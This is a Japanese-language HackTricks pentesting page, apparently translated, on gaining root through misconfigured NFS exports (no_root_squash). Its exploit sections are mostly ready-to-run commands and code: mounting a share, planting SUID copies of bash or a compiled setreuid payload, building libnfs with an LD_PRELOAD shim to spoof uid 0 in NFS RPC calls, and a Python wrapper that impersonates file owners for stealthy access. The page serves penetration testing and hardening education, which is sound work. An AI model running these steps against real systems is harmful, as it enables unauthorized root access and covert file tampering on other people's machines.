{{#include ../../banners/hacktricks-training.md}}

# 基本情報の圧縮

NFSは通常（特にLinuxでは）、ファイルにアクセスするために接続しているクライアントによって示された`uid`と`gid`を信頼します（Kerberosが使用されていない場合）。しかし、サーバーで**この動作を変更する**ために設定できるいくつかの構成があります：

- **`all_squash`**: すべてのアクセスを圧縮し、すべてのユーザーとグループを**`nobody`**（65534 unsigned / -2 signed）にマッピングします。したがって、誰もが`nobody`となり、ユーザーは使用されません。
- **`root_squash`/`no_all_squash`**: これはLinuxのデフォルトであり、**uid 0（root）のアクセスのみを圧縮**します。したがって、任意の`UID`と`GID`は信頼されますが、`0`は`nobody`に圧縮されるため、rootの偽装は不可能です。
- **`no_root_squash`**: この構成が有効になっている場合、rootユーザーさえも圧縮されません。これは、この構成でディレクトリをマウントすると、rootとしてアクセスできることを意味します。

**/etc/exports**ファイルで、**no_root_squash**として構成されているディレクトリを見つけた場合、**クライアントとして**それに**アクセス**し、そのディレクトリの中に**ローカルの**マシンの**root**のように**書き込む**ことができます。

**NFS**に関する詳細情報は、以下を確認してください：

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# 権限昇格

## リモートエクスプロイト

オプション1：bashを使用して：
- **クライアントマシンでそのディレクトリをマウントし、**rootとしてマウントされたフォルダ内に**/bin/bash**バイナリをコピーし、**SUID**権限を与え、**被害者**マシンからそのbashバイナリを実行します。
- NFS共有内でrootになるためには、**`no_root_squash`**がサーバーで構成されている必要があります。
- ただし、有効になっていない場合は、バイナリをNFS共有にコピーし、昇格したいユーザーとしてSUID権限を与えることで、他のユーザーに昇格することができます。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 using c compiled code:
- **クライアントマシンでそのディレクトリをマウント**し、**ルートとして**マウントされたフォルダ内にSUID権限を悪用するコンパイル済みペイロードをコピーし、**SUID**権限を与え、**被害者**マシンからそのバイナリを**実行**します（ここにいくつかの[C SUIDペイロード](payloads-to-execute.md#c)があります）。
- 前と同じ制限が適用されます。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## ローカルエクスプロイト

> [!NOTE]
> あなたのマシンから被害者のマシンへの**トンネルを作成できる場合、リモートバージョンを使用してこの特権昇格を悪用することができます**。\
> 次のトリックは、ファイル`/etc/exports`が**IPを示している場合**です。この場合、**リモートエクスプロイトを使用することはできず**、**このトリックを悪用する必要があります**。\
> エクスプロイトが機能するためのもう一つの要件は、**`/etc/export`内のエクスポートが`insecure`フラグを使用している必要があることです**。\
> --_`/etc/export`がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--

## 基本情報

このシナリオは、ローカルマシン上のマウントされたNFS共有を悪用し、クライアントがuid/gidを指定できるNFSv3仕様の欠陥を利用して、無許可のアクセスを可能にします。悪用には、NFS RPCコールの偽造を可能にするライブラリ[libnfs](https://github.com/sahlberg/libnfs)を使用します。

### ライブラリのコンパイル

ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには、次のコマンドが含まれます：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 攻撃の実行

攻撃は、特権をルートに昇格させ、その後シェルを実行するシンプルなCプログラム（`pwn.c`）を作成することを含みます。プログラムはコンパイルされ、結果として得られたバイナリ（`a.out`）は、RPC呼び出しでuidを偽装するために`ld_nfs.so`を使用して、suid rootで共有に配置されます。

1. **攻撃コードをコンパイルする:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **共有にエクスプロイトを配置し、uidを偽装してその権限を変更する:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **エクスプロイトを実行してルート権限を取得する:**
```bash
/mnt/share/a.out
#root
```
## ボーナス: NFShellによるステルスファイルアクセス

rootアクセスが取得されると、所有権を変更せずにNFS共有と対話するために、Pythonスクリプト(nfsh.py)が使用されます。このスクリプトは、アクセスされるファイルのuidを一致させることで、権限の問題なしに共有上のファイルと対話できるようにします:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
実行するには:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
